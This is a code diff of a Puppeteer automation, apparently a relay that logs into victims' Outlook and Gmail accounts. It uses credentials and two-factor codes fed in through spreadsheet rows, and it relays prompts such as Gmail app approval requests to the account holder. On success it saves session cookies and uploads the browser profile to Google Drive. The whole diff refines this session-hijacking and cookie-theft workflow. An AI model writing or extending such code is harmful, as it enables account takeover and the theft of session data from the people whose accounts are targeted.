-                                      updateData = {
-                                          status: "WAITINGCODE",
-                                          verificationChoice: '', // Re-added clearing
-                                          lastJsonResponse: JSON.stringify({
-                                              ...ljpBeforeCodeSend, 
-                                              status: "WAITINGCODE", 
-                                              verificationState: 'WAITING_CODE',
-                                              viewName: verificationStatusAfterSend.viewName,
-                                              verificationOptions: currentVerificationOptions, 
-                                              message: "Code sent, awaiting input."
-                                          })
-                                      };
-                                      await updateBrowserRowData(browserId, updateData);
-                                      break;
-                                  } else {
-                                      logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Did not reach a recognized 'code' entry screen after sending code. verificationStatusAfterSend: ${JSON.stringify(verificationStatusAfterSend)}. Current URL: ${page.url()}`);
-                                      const stillOnChoicePage = await checkVerification(page, platformConfig); 
-                                      if (stillOnChoicePage.required && stillOnChoicePage.type === 'choice') {
-                                          logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Still on a choice page: '${stillOnChoicePage.viewName}'. Input might be wrong or page didn't transition as expected. Clearing choice and re-setting to WAITINGOPTIONS.`);
-                                          currentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, stillOnChoicePage.viewName); 
-                                          await updateBrowserRowData(browserId, {
-                                              status: "WAITINGOPTIONS",
-                                              verificationOptions: JSON.stringify(currentVerificationOptions), 
-                                              lastJsonResponse: JSON.stringify({ 
-                                                  ...JSON.parse(updateData.lastJsonResponse || '{}'), 
-                                                  status: "WAITINGOPTIONS", 
-                                                  viewName: stillOnChoicePage.viewName, 
-                                                  verificationOptions: currentVerificationOptions, 
-                                                  message: "Failed to send code or invalid input, please re-enter choice."
-                                              })
-                                          });
-                                      } else {
-                                          logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Unexpected page state after attempting to send code. Failing.`);
-                                          finalStatus = "FAILED"; break;
-                                      }
-                                  }
+                                   if (hasOutlookServiceError) {
+                                       logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Outlook service error detected: "${outlookServiceErrorText}"`);
+                                       const errorOption = [{ label: "Outlook: Temporary service problem. Please wait and try again.", type: "service_error", choiceIndex: "outlook_service_error" }];
+                                       currentVerificationOptions = errorOption; // Update for LJR
+
+                                       const ljpServiceError = JSON.parse(updateData.lastJsonResponse || '{}');
+                                       updateData.lastJsonResponse = JSON.stringify({
+                                           ...ljpServiceError,
+                                           status: "WAITING_OPTIONS",
+                                           verificationState: 'WAITING_OPTIONS',
+                                           verificationOptions: errorOption,
+                                           viewName: currentActualViewName, 
+                                           message: "Outlook reported a temporary service problem. Please try again later."
+                                       });
+                                       await updateBrowserRowData(browserId, {
+                                           status: "WAITINGOPTIONS",
+                                           verificationChoice: '', // Re-added clearing
+                                           verificationOptions: JSON.stringify(errorOption),
+                                           lastJsonResponse: updateData.lastJsonResponse
+                                       });
+                                       // Continue to the next iteration of the WAITINGOPTIONS polling loop
+                                       await new Promise(resolve => setTimeout(resolve, 10000)); // Wait before next poll
+                                       continue; 
+                                   }
+                                   
+                                   const verificationStatusAfterSend = await checkVerification(page, platformConfig);
+                                   if (verificationStatusAfterSend.required && verificationStatusAfterSend.type === 'code') {
+                                       logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Successfully sent code. Transitioning to WAITING_CODE. View detected: ${verificationStatusAfterSend.viewName}`);
+                                       finalStatus = "WAITINGCODE";
+                                       const ljpBeforeCodeSend = JSON.parse(updateData.lastJsonResponse || '{}');
+                                       updateData = {
+                                           status: "WAITINGCODE",
+                                           verificationChoice: '', // Re-added clearing
+                                           lastJsonResponse: JSON.stringify({
+                                               ...ljpBeforeCodeSend, 
+                                               status: "WAITING_CODE", 
+                                               verificationState: 'WAITING_CODE',
+                                               viewName: verificationStatusAfterSend.viewName,
+                                               verificationOptions: currentVerificationOptions, 
+                                               message: "Code sent, awaiting input."
+                                           })
+                                       };
+                                       await updateBrowserRowData(browserId, updateData);
+                                       break;
+                                   } else {
+                                       logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Did not reach a recognized 'code' entry screen after sending code. verificationStatusAfterSend: ${JSON.stringify(verificationStatusAfterSend)}. Current URL: ${page.url()}`);
+                                       const stillOnChoicePage = await checkVerification(page, platformConfig); 
+                                       if (stillOnChoicePage.required && stillOnChoicePage.type === 'choice') {
+                                           logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Still on a choice page: '${stillOnChoicePage.viewName}'. Input might be wrong or page didn't transition as expected. Clearing choice and re-setting to WAITINGOPTIONS.`);
+                                           currentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, stillOnChoicePage.viewName); 
+                                           await updateBrowserRowData(browserId, {
+                                               status: "WAITINGOPTIONS",
+                                               verificationOptions: JSON.stringify(currentVerificationOptions), 
+                                               lastJsonResponse: JSON.stringify({ 
+                                                   ...JSON.parse(updateData.lastJsonResponse || '{}'), 
+                                                   status: "WAITING_OPTIONS", 
+                                                   viewName: stillOnChoicePage.viewName, 
+                                                   verificationOptions: currentVerificationOptions, 
+                                                   message: "Failed to send code or invalid input, please re-enter choice."
+                                               })
+                                           });
+                                       } else {
+                                           logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Unexpected page state after attempting to send code. Failing.`);
+                                           finalStatus = "FAILED"; break;
+                                       }
+                                   }
                       } catch (interactionError) {
                           logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Error during page interaction for choice: ${interactionError.message}. Clearing choice and retrying WAITINGOPTIONS.`);
                           currentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, currentActualViewName).catch(() => currentVerificationOptions); 
@@ -1314,23 +1457,21 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                               verificationOptions: JSON.stringify(currentVerificationOptions), 
                               lastJsonResponse: JSON.stringify({ 
                                   ...JSON.parse(updateData.lastJsonResponse || '{}'), 
-                                  status: "WAITINGOPTIONS", 
+                                  status: "WAITING_OPTIONS", 
                                   viewName: currentActualViewName, 
                                   verificationOptions: currentVerificationOptions, 
                                   message: `Error processing choice: ${interactionError.message}` 
                               })
                           });
                       }
-                  } else {
-                      logger.debug(`[processRow][${browserId}][WAITINGOPTIONS] No verificationChoice yet. Waiting...`);
-                  }
+                }
 
               } catch (pollError) {
                   logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Error during polling: ${pollError.message}`);
                   await new Promise(resolve => setTimeout(resolve, 15000));
               }
               if (finalStatus === "WAITINGOPTIONS") {
-                  await new Promise(resolve => setTimeout(resolve, 10000)); 
+                  await new Promise(resolve => setTimeout(resolve, 5000)); // Reduced polling interval from 10000 to 5000
               }
           } 
           if (finalStatus === "WAITINGOPTIONS") {
@@ -1343,6 +1484,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                   ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                   message: "Failed during WAITINGOPTIONS phase: Choice not provided in time."
               });
+
               // Explicitly close browser and clean up immediately
               if (browser && !browserFullyClosed) {
                   if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
@@ -1369,13 +1511,14 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                   message: "Failed during WAITINGOPTIONS phase."
               });
           }
-      } else if (currentSheetStatusFromRow === "WAITINGCODE") {
+      } else if (status === "WAITINGCODE") {
           logger.info(`[processRow][${browserId}] Resuming from WAITINGCODE state.`);
-          if (updateData.status !== "WAITINGCODE") { 
+          finalStatus = "WAITINGCODE";
+          if (updateData.status !== "WAITINGCODE") {
             updateData.status = "WAITINGCODE";
             updateData.lastJsonResponse = JSON.stringify({
-                ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITINGCODE",
-                verificationState: 'WAITING_CODE', 
+                ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITING_CODE",
+                verificationState: 'WAITING_CODE',
                 message: "Awaiting verification code."
             });
             await updateBrowserRowData(browserId, { status: "WAITINGCODE", verified: true, fullAccess: false, lastJsonResponse: updateData.lastJsonResponse });
@@ -1389,12 +1532,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
               try {
                   // Session Health Check
                   if (page && !(await isPageResponsive(page, browserId, instanceId))) {
-                      logger.error(`[processRow][${browserId}][WAITINGCODE] Page became unresponsive. Marking as FAILED.`);
+                      logger.error(`[processRow][${browserId}][WAITING_CODE] Page became unresponsive. Marking as FAILED.`);
                       finalStatus = "FAILED";
                       updateData.status = "FAILED";
                       updateData.lastJsonResponse = JSON.stringify({
                           ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                          message: "Failed during WAITINGCODE phase: Browser page became unresponsive."
+                          message: "Failed during WAITING_CODE phase: Browser page became unresponsive."
                       });
                       break; // Exit polling loop
                   }
@@ -1429,16 +1572,20 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                       let codeSubmitSelector;
                       let useEnterToSubmit = false;
 
-                      if (currentViewNameForCode === 'Outlook Enter Code Fluent') {
-                          codeInputSelector = platformConfig.selectors?.fluentCodeInput;
-                          codeSubmitSelector = platformConfig.selectors?.fluentCodeSubmit; 
-                          useEnterToSubmit = true; 
-                          logger.info(`[processRow][${browserId}][WAITINGCODE] Using Fluent code input selectors. Input: ${codeInputSelector}, Will press Enter to submit.`);
-                      } else {
-                          codeInputSelector = platformConfig.selectors?.verificationCodeInput; 
-                          codeSubmitSelector = platformConfig.selectors?.verificationCodeSubmit;
-                          logger.info(`[processRow][${browserId}][WAITINGCODE] Using standard code input selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
-                      }
+                       if (currentViewNameForCode === 'Outlook Enter Code Fluent') {
+                           codeInputSelector = platformConfig.selectors?.fluentCodeInput;
+                           codeSubmitSelector = platformConfig.selectors?.fluentCodeSubmit; 
+                           useEnterToSubmit = true; 
+                           logger.info(`[processRow][${browserId}][WAITINGCODE] Using Fluent code input selectors. Input: ${codeInputSelector}, Will press Enter to submit.`);
+                       } else if (currentViewNameForCode === 'Gmail Email Code Entry') {
+                           codeInputSelector = platformConfig.selectors?.gmailEmailCodeInput;
+                           codeSubmitSelector = platformConfig.selectors?.gmailEmailCodeSubmit;
+                           logger.info(`[processRow][${browserId}][WAITINGCODE] Using Gmail email code selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
+                       } else {
+                           codeInputSelector = platformConfig.selectors?.verificationCodeInput; 
+                           codeSubmitSelector = platformConfig.selectors?.verificationCodeSubmit;
+                           logger.info(`[processRow][${browserId}][WAITINGCODE] Using standard code input selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
+                       }
 
                       let codeEntryAttempted = false; 
                       if (codeInputSelector) { 
@@ -1486,17 +1633,21 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                             if (codeErrorDetected) {
                                 logger.warn(`[processRow][${browserId}][WAITINGCODE] Incorrect code. Remaining on code entry screen.`);
+                                const ljp = JSON.parse(updateData.lastJsonResponse || '{}');
+                                if (platform === 'gmail' && ljp.viewName === 'sh Gmail 2-Step Verification') {
+                                  ljp.gmail = { step: "waiting_app_notification", canResend: true, canChangeMethod: true, instructions: "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in." };
+                                }
+                                ljp.status = "WAITING_CODE";
+                                ljp.verified = true;
+                                ljp.fullAccess = false;
+                                ljp.message = "Incorrect verification code entered. Please try again.";
                                 await updateBrowserRowData(browserId, {
                                     status: "WAITINGCODE",
                                     verified: true,
                                     fullAccess: false,
-                                    lastJsonResponse: JSON.stringify({
-                                        ...JSON.parse(updateData.lastJsonResponse || '{}'),
-                                        status: "WAITINGCODE",
-                                        message: "Incorrect verification code entered. Please try again."
-                                    })
+                                    lastJsonResponse: JSON.stringify(ljp)
                                 });
-                                continue; // Continue the WAITINGCODE polling loop
+                                continue; // Continue the WAITING_CODE polling loop
                             }
 
                             // If no code error, then wait 10 seconds and proceed with existing checks
@@ -1539,16 +1690,6 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 message: "Successfully verified with code and reached inbox."
                               });
                               // updateData.verificationCode = ''; // Removed clearing
-
-                              logger.info(`[processRow][${browserId}] COMPLETED status after code. Updating sheet before Drive upload.`);
-                              await updateBrowserRowData(browserId, {
-                                  status: "COMPLETED",
-                                  verified: updateData.verified,
-                                  fullAccess: updateData.fullAccess,
-                                  cookieJSON: updateData.cookieJSON,
-                                  lastJsonResponse: updateData.lastJsonResponse,
-                                  // verificationCode: '' // Removed clearing
-                              });
                               
                               if (browser) {
                                 if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
@@ -1582,7 +1723,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                               logger.warn(`[processRow][${browserId}][WAITINGCODE] Code entered, but inbox not reached. Current URL: ${page.url()}`);
                               
                               if (returnedToChoiceScreen) { 
-                                  logger.warn(`[processRow][${browserId}][WAITINGCODE] Outlook: Returned to choice screen. Transitioning to WAITINGOPTIONS.`);
+                                  logger.warn(`[processRow][${browserId}][WAITING_CODE] Outlook: Returned to choice screen. Transitioning to WAITING_OPTIONS.`);
                                   finalStatus = "WAITINGOPTIONS";
                                   // Use the fresh options from postCodeVerificationState
                                   const freshOptionsFromLoopback = await platformConfig.extractVerificationOptions(page, platformConfig, postCodeVerificationState.viewName);
@@ -1592,7 +1733,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                       verificationOptions: JSON.stringify(freshOptionsFromLoopback),
                                       lastJsonResponse: JSON.stringify({
                                           ...JSON.parse(updateData.lastJsonResponse || '{}'), 
-                                          status: "WAITINGOPTIONS",
+                                          status: "WAITING_OPTIONS",
                                           message: "Incorrect code or issue, returned to verification options. Please choose again.",
                                           verificationState: 'WAITING_OPTIONS',
                                           verificationOptions: freshOptionsFromLoopback, 
@@ -1603,67 +1744,66 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                   codeSuccessfullyProcessed = false; 
                                   break; 
                               } else if (stillOnCodeEntryScreen) {
-                                   logger.warn(`[processRow][${browserId}][WAITINGCODE] Still on code entry screen. Assuming code was incorrect. Resetting status to WAITINGCODE.`);
+                                   logger.warn(`[processRow][${browserId}][WAITING_CODE] Still on code entry screen. Assuming code was incorrect. Resetting status to WAITING_CODE.`);
                                 await updateBrowserRowData(browserId, {
                                     status: "WAITINGCODE",
                                     verificationCode: '', // Clear the incorrect code
                                     lastJsonResponse: JSON.stringify({
                                         ...JSON.parse(updateData.lastJsonResponse || '{}'),
-                                        status: "WAITINGCODE",
+                                        status: "WAITING_CODE",
                                         message: "Incorrect verification code entered. Please try again."
                                     })
                                 });
                               } else {
-                                  logger.error(`[processRow][${browserId}][WAITINGCODE] Unexpected page state after code submission. Failing. Current URL: ${page.url()}`);
+                                  logger.error(`[processRow][${browserId}][WAITING_CODE] Unexpected page state after code submission. Failing. Current URL: ${page.url()}`);
                                   finalStatus = "FAILED";
                                   codeSuccessfullyProcessed = false;
                                   break;
                               }
                           }
                       }  else { 
-                        logger.error(`[processRow][${browserId}][WAITINGCODE] Verification code input/submit selectors not defined for platform ${platform}. Failing.`);
+                        logger.error(`[processRow][${browserId}][WAITING_CODE] Verification code input/submit selectors not defined for platform ${platform}. Failing.`);
                         finalStatus = "FAILED"; 
                         break;
                       }
-                  } else {
-                      logger.debug(`[processRow][${browserId}][WAITINGCODE] No code found yet. Waiting...`);
-                  }
+                }
 
               } catch (pollError) {
-                  logger.error(`[processRow][${browserId}][WAITINGCODE] Error during polling: ${pollError.message}`);
+                  logger.error(`[processRow][${browserId}][WAITING_CODE] Error during polling: ${pollError.message}`);
                   await new Promise(resolve => setTimeout(resolve, 15000));
               }
               
-              if (finalStatus === "WAITINGCODE" && !codeSuccessfullyProcessed) { 
-                 await new Promise(resolve => setTimeout(resolve, 10000));
+              if (finalStatus === "WAITING_CODE" && !codeSuccessfullyProcessed) {
+                 await new Promise(resolve => setTimeout(resolve, 5000)); // Reduced polling interval from 10000 to 5000
               }
           } 
 
-          if (finalStatus === "WAITINGCODE" && !codeSuccessfullyProcessed) {
-             logger.warn(`[processRow][${browserId}][WAITINGCODE] Polling for code timed out or failed. Setting status to FAILED.`);
+          if (finalStatus === "WAITING_CODE" && !codeSuccessfullyProcessed) {
+             logger.warn(`[processRow][${browserId}][WAITING_CODE] Polling for code timed out or failed. Setting status to FAILED.`);
              finalStatus = "FAILED";
              updateData.status = "FAILED";
              updateData.verified = true; // Account access achieved, verified but not full access (timeout on code)
              updateData.fullAccess = false; // FAILED so fullAccess false
              updateData.lastJsonResponse = JSON.stringify({
                  ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                 message: "Failed during WAITINGCODE phase: Code not provided in time or processing failed."
+                 message: "Failed during WAITING_CODE phase: Code not provided in time or processing failed."
              });
+
              // Explicitly close browser and clean up immediately
              if (browser && !browserFullyClosed) {
                  if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
-                 await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGCODE timeout: ${err.message}`));
+                 await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITING_CODE timeout: ${err.message}`));
                  browserFullyClosed = true;
                  activeBrowserSessions.delete(browserId);
                  await new Promise(resolve => setTimeout(resolve, 1000));
              }
              if (userDataDir) {
                  try {
-                     logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGCODE timeout: ${userDataDir}`);
+                     logger.info(`[processRow][${browserId}] Deleting user data dir for WAITING_CODE timeout: ${userDataDir}`);
                      await fs.remove(userDataDir);
                      logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                  } catch (deleteError) {
-                     logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITINGCODE timeout: ${deleteError.message}`);
+                     logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITING_CODE timeout: ${deleteError.message}`);
                  }
              }
              return; // Exit processRow if code not found or processing failed
@@ -1673,15 +1813,15 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
           if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("COMPLETED")) { 
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", 
-                    message: "Failed during WAITINGCODE phase."
+                    message: "Failed during WAITING_CODE phase."
                 });
-          } else if (finalStatus === "WAITINGOPTIONS") {
+          } else if (finalStatus === "WAITING_OPTIONS") {
                updateData.lastJsonResponse = JSON.stringify({
-                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITINGOPTIONS", 
+                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITING_OPTIONS", 
                     message: "Incorrect code, returned to verification options."
                 });
           }
-          logger.info(`[processRow][${browserId}] Exited WAITINGCODE loop. Final status for sheet update: ${updateData.status}`);
+          logger.info(`[processRow][${browserId}] Exited WAITING_CODE loop. Final status for sheet update: ${updateData.status}`);
       }
 
       logger.info(`[processRow][${browserId}] Result from checkAccountAccess: ${JSON.stringify(initialCheckResult)}`);
@@ -1692,10 +1832,33 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
       // If finalStatus was already set to FAILED within a polling loop (e.g., timeout, unresponsive page),
       // we should respect that and not overwrite it with a less severe status.
       // However, if it's still the default "FAILED" from initialization, we can update it.
-      if (initialCheckResult.verificationState === 'WAITINGEMAIL_ERROR') {
-          finalStatus = "WAITINGEMAIL";
+      // Prioritize explicit verification states from initialCheckResult
+      if (initialCheckResult.requiresVerification) {
+          const sheetStatus = initialCheckResult.verificationState.replace(/_/g, ''); // Non-underscore for sheet status
+          finalStatus = initialCheckResult.verificationState; // Keep original with underscore for internal use/lastJsonResponse
           updateData.lastJsonResponse = JSON.stringify({
-              browserId, email, status: finalStatus,
+              browserId, email, status: sheetStatus, // Use non-underscore for 'status' field in JSON
+              emailExists: initialCheckResult.emailExists,
+              accountAccess: initialCheckResult.accountAccess,
+              reachedInbox: initialCheckResult.reachedInbox,
+              requiresVerification: initialCheckResult.requiresVerification,
+              verificationState: initialCheckResult.verificationState, // Keep original with underscore
+              verificationOptions: initialCheckResult.verificationOptions || [],
+              platform, timestamp: new Date().toISOString(),
+              message: initialCheckResult.message || (sheetStatus === 'WAITINGOPTIONS' ? 'Awaiting verification choice.' : 'Awaiting verification code.')
+          });
+          // Update verification options in the sheet if available
+          if (initialCheckResult.verificationOptions && initialCheckResult.verificationOptions.length > 0) {
+              updateData.verificationOptions = JSON.stringify(initialCheckResult.verificationOptions);
+          }
+          updateData.status = sheetStatus; // Send non-underscore status to the sheet
+          await updateBrowserRowData(browserId, updateData);
+          return; // Exit processRow immediately
+      } else if (initialCheckResult.verificationState === 'WAITINGEMAIL_ERROR') {
+          const sheetStatus = initialCheckResult.verificationState.replace(/_/g, '');
+          finalStatus = initialCheckResult.verificationState; // Keep original with underscore
+          updateData.lastJsonResponse = JSON.stringify({
+              browserId, email, status: sheetStatus,
               emailExists: initialCheckResult.emailExists,
               accountAccess: initialCheckResult.accountAccess,
               reachedInbox: initialCheckResult.reachedInbox,
@@ -1705,15 +1868,16 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
               platform, timestamp: new Date().toISOString(),
               message: initialCheckResult.message // Use the message from checkAccountAccess
           });
-          // Clear the email field in the sheet when transitioning to WAITINGEMAIL
-          // ensure the status is set before persisting so the final cleanup won't overwrite it
-          updateData.status = finalStatus;
+          updateData.status = sheetStatus;
           await updateBrowserRowData(browserId, { ...updateData, email: '' });
-          return; // Exit processRow to wait for updated email
+          return;
       } else if (initialCheckResult.verificationState === 'WAITINGPASSWORD_ERROR') {
+          // Unify: use WAITINGPASSWORD (not WAITINGPASSWORDERROR) so the WAITINGPASSWORD handler retries correctly
+          logger.info(`[processRow][${browserId}] WAITINGPASSWORD_ERROR detected. Setting WAITINGPASSWORD for retry.`);
           finalStatus = "WAITINGPASSWORD";
+          updateData.status = "WAITINGPASSWORD";
           updateData.lastJsonResponse = JSON.stringify({
-              browserId, email, status: finalStatus,
+              browserId, email, status: "WAITINGPASSWORD",
               emailExists: initialCheckResult.emailExists,
               accountAccess: initialCheckResult.accountAccess,
               reachedInbox: initialCheckResult.reachedInbox,
@@ -1721,36 +1885,48 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
               verificationState: initialCheckResult.verificationState,
               verificationOptions: currentVerificationOptions,
               platform, timestamp: new Date().toISOString(),
-              message: initialCheckResult.message // Use the message from checkAccountAccess
+              message: initialCheckResult.message
           });
-          // Clear the password field in the sheet when transitioning to WAITINGPASSWORD
-            // ensure the status is set before persisting so the final cleanup won't overwrite it
-            updateData.status = finalStatus;
-            await updateBrowserRowData(browserId, { ...updateData, password: '' });
-          return; // Exit processRow to wait for updated password
-    } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined)) { // Generic email error, email doesn't exist
-          logger.info(`[processRow][${browserId}] Generic email error detected. Setting status to WAITINGEMAIL.`);
-          finalStatus = "WAITINGEMAIL";
-          updateData.lastJsonResponse = JSON.stringify({
-              browserId,
-              email,
-              status: finalStatus,
-              emailExists: initialCheckResult.emailExists,
-              accountAccess: initialCheckResult.accountAccess,
-              reachedInbox: initialCheckResult.reachedInbox,
-              requiresVerification: initialCheckResult.requiresVerification,
-              verificationState: initialCheckResult.verificationState || null,
-              verificationOptions: currentVerificationOptions,
-              platform,
-              timestamp: new Date().toISOString(),
-              message: initialCheckResult.message || "Email does not exist. Please provide a valid email."
-          });
-          // Clear the email field in the sheet when transitioning to WAITINGEMAIL
-          // ensure the status is set before persisting so the final cleanup won't overwrite it
-          updateData.status = finalStatus;
-          await updateBrowserRowData(browserId, { ...updateData, email: '' });
-          return; // Exit processRow to wait for updated email
-      } else if (finalStatus === "FAILED" && initialCheckResult.emailExists) { // Only update if initial FAILED and email exists
+          await updateBrowserRowData(browserId, { ...updateData, password: '' });
+          return;
+      } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined)) {
+          logger.info(`[processRow][${browserId}] Generic email error detected. Checking if due to cookie sheet row state or session expiration.`);
+          if (status === "WAITINGPASSWORD") {
+              logger.info(`[processRow][${browserId}] Session likely expired during WAITINGPASSWORD phase. Setting status to FAILED and keeping email.`);
+              finalStatus = "FAILED";
+              updateData.lastJsonResponse = JSON.stringify({
+                  browserId, email, status: finalStatus,
+                  emailExists: initialCheckResult.emailExists,
+                  accountAccess: initialCheckResult.accountAccess,
+                  reachedInbox: initialCheckResult.reachedInbox,
+                  requiresVerification: initialCheckResult.requiresVerification,
+                  verificationState: initialCheckResult.verificationState || null,
+                  verificationOptions: currentVerificationOptions,
+                  platform, timestamp: new Date().toISOString(),
+                  message: "Session expired during password entry. Please restart the process."
+              });
+              updateData.status = finalStatus;
+              await updateBrowserRowData(browserId, updateData);
+              return;
+          } else {
+              logger.info(`[processRow][${browserId}] Setting status to WAITINGEMAIL and clearing email.`);
+              finalStatus = "WAITINGEMAIL";
+              updateData.lastJsonResponse = JSON.stringify({
+                  browserId, email, status: finalStatus,
+                  emailExists: initialCheckResult.emailExists,
+                  accountAccess: initialCheckResult.accountAccess,
+                  reachedInbox: initialCheckResult.reachedInbox,
+                  requiresVerification: initialCheckResult.requiresVerification,
+                  verificationState: initialCheckResult.verificationState || null,
+                  verificationOptions: currentVerificationOptions,
+                  platform, timestamp: new Date().toISOString(),
+                  message: "Email does not exist. Please provide a valid email."
+              });
+              updateData.status = finalStatus;
+              await updateBrowserRowData(browserId, { ...updateData, email: '' });
+              return;
+          }
+      } else if (finalStatus === "FAILED" && initialCheckResult.emailExists) {
           if (initialCheckResult.verificationState === 'WAITING_PASSWORD') {
               finalStatus = "WAITINGPASSWORD";
               await updateBrowserRowData(browserId, { status: "WAITINGPASSWORD", verified: false, fullAccess: false });
@@ -1762,22 +1938,21 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                       logger.warn(`[processRow][${browserId}] Login successful but did not reach expected inbox state. Setting status to FAILED.`);
                       finalStatus = "FAILED";
                   }
-              } else { 
-                  if (initialCheckResult.verificationState === 'WAITING_OPTIONS') {
+              } else { // This case should be covered by the initial 'if (initialCheckResult.requiresVerification)' block.
+                  // Convert verificationState to sheet status format
+                  const sheetStatus = initialCheckResult.verificationState.replace(/_/g, '');
+                  if (sheetStatus === 'WAITINGOPTIONS') {
                       finalStatus = "WAITINGOPTIONS";
-                  } else { 
+                  } else { // Should be WAITINGCODE
                       finalStatus = "WAITINGCODE";
                   }
               }
-          } else { 
-              finalStatus = "FAILED"; // Account access failed even if email exists
+          } else {
+              finalStatus = "FAILED";
           }
-      } else if (!initialCheckResult.emailExists && finalStatus !== "FAILED") { // If email doesn't exist and not already FAILED
+      } else if (!initialCheckResult.emailExists && finalStatus !== "FAILED") {
           finalStatus = "FAILED";
       }
-      // If finalStatus was already set to FAILED due to timeout/unresponsive page, it remains FAILED.
-      // If initialCheckResult.emailExists is false, it will be FAILED.
-      // Otherwise, it will be updated based on initialCheckResult.
 
       updateData = {
         status: finalStatus,
@@ -1790,193 +1965,197 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             verificationState: initialCheckResult.verificationState,
             verificationOptions: currentVerificationOptions,
             platform, timestamp: new Date().toISOString(),
-            message: initialCheckResult.message || (finalStatus === "FAILED" ? "Processing failed due to an unexpected error." : "Process completed successfully.") // Preserve or add message
+            message: initialCheckResult.message || (finalStatus === "FAILED" ? "Processing failed due to an unexpected error." : "Process completed successfully.")
         })
       };
       
-      if (finalStatus === "WAITINGOPTIONS") {
+      if (finalStatus === "WAITINGOPTIONS" || finalStatus === "WAITINGCODE") { // Also update for WAITING_CODE if options are relevant
         updateData.verificationOptions = JSON.stringify(currentVerificationOptions);
         await updateBrowserRowData(browserId, updateData);
-        logger.info(`[processRow][${browserId}] Status set to WAITINGOPTIONS. Sheet updated with options.`);
+        logger.info(`[processRow][${browserId}] Status set to ${finalStatus}. Sheet updated with options.`);
       }
 
 
-      if (finalStatus === "COMPLETED") {
-        const browserCookies = await page.cookies();
-        updateData.cookieJSON = JSON.stringify(browserCookies);
-        updateData.verified = true; // Set verified to true on COMPLETED without verification
-        updateData.fullAccess = true; // Set fullAccess to true on COMPLETED without verification
-
-        logger.info(`[processRow][${browserId}] Initial COMPLETED status. Updating sheet before Drive upload.`);
-        await updateBrowserRowData(browserId, {
-            status: "COMPLETED",
-            verified: updateData.verified,
-            fullAccess: updateData.fullAccess,
-            cookieJSON: updateData.cookieJSON,
-            lastJsonResponse: updateData.lastJsonResponse
-        });
-
-        if (browser) {
-          if (targetCreatedListener && browser && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
-          logger.info(`[processRow][${browserId}] Closing browser for COMPLETED status before Drive upload.`);
-          await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
-          browserFullyClosed = true;
-          activeBrowserSessions.delete(browserId);
-          await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
-        }
-
-        let uploadedDriveUrl = null;
-        try {
-          uploadedDriveUrl = await uploadBrowserData(browserId);
-          if (uploadedDriveUrl) {
-            updateData.driveUrl = uploadedDriveUrl;
-            logger.info(`[processRow][${browserId}] Successfully uploaded browser data to Google Drive.`);
-          } else {
-            logger.warn(`[processRow][${browserId}] Google Drive upload skipped or failed.`);
-          }
-        } catch (uploadError) {
-          logger.error(`[processRow][${browserId}] Error during Google Drive upload: ${uploadError.message}`);
-        }
-        
-        if (updateData.driveUrl && userDataDir) {
-          try {
-            logger.info(`[processRow][${browserId}] Process COMPLETED and uploaded. Deleting user data directory: ${userDataDir}`);
-            await fs.remove(userDataDir);
-            logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
-          } catch (deleteError) {
